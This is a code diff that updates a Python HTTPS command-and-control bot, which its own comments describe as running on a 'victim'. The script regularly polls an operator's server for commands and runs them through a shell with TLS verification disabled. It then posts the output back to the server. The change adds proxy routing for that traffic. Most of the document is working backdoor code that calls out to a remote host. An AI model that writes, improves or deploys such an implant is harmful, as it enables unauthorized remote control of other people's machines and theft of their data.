@@ -1,24 +1,33 @@
-#https_bot v0.4
+#https_bot v0.5
 import requests
 import logging
 import subprocess
 import time
 from optparse import OptionParser
 
-def beacon(host, seconds):
+
+def beacon(host, seconds, proxies):
   time.sleep(int(seconds))
-  fetch, content = request(host)
+  fetch, content = request(host, proxies)
   if str(fetch) == "<Response [200]>":
     output = parse(content)
-    send(host, output)
+    send(host, output, proxies)
   
-def send(host, output):
-  response = requests.post('https://'+host+'/out', data=output, verify=False)
-  return response 
+def send(host, output, proxies):
+  if proxies is not None:
+    response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies)
+    return response     
+  else:
+    response = requests.post('https://'+host+'/out', data=output, verify=False)
+    return response 
 
-def request(host):
-  response = requests.get('https://'+host+'/command', verify=False)
-  return response, response.text
+def request(host, proxies):
+  if proxies is not None:
+    response = requests.get('https://'+host+'/command', verify=False, proxies=proxies)
+    return response, response.text
+  else:
+    response = requests.get('https://'+host+'/command', verify=False)
+    return response, response.text
 
 def request_certs(host, pcert, key):
   response = requests.get('https://'+host, verify=False, cert=(pcert, key))
@@ -35,6 +44,7 @@ def execute(command):
   proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   stdoutput = proc.stdout.read() + proc.stderr.read()
   return stdoutput
+
 
 def main():
   # Setup the command line arguments.
@@ -55,7 +65,7 @@ def main():
   optp.add_option("-s", "--server", dest="server",
                   help="HTTPS server to query")
   # Option to use client certificates
-  optp.add_option("-p", "--cert", dest="cert",
+  optp.add_option("-c", "--cert", dest="cert",
                   help="public certificate")
   # Option to use client certificates
   optp.add_option("-k", "--key", dest="key",
@@ -63,8 +73,19 @@ def main():
   # How often should the victim beacon
   optp.add_option("-b", "--beacon", dest="beacon",
                   help="sleep between beacons in seconds")
+  # Which proxy to use
+  optp.add_option("-p", "--proxy", dest="proxy",
+                  help="sleep between beacons in seconds")
 
   opts, args = optp.parse_args()
+
+  #Prep proxy support
+  if opts.proxy is None:
+    proxies = None
+  else:
+    proxies = {
+      "https": opts.proxy,
+    }
 
   # Setup logging.
   logging.basicConfig(level=opts.loglevel,
@@ -76,7 +97,7 @@ def main():
   # Main Event Loop:
   try:
     while 1:
-      beacon(opts.server, opts.beacon)
+      beacon(opts.server, opts.beacon, proxies)
 
   except (KeyboardInterrupt, EOFError) as e:
     exit(0)
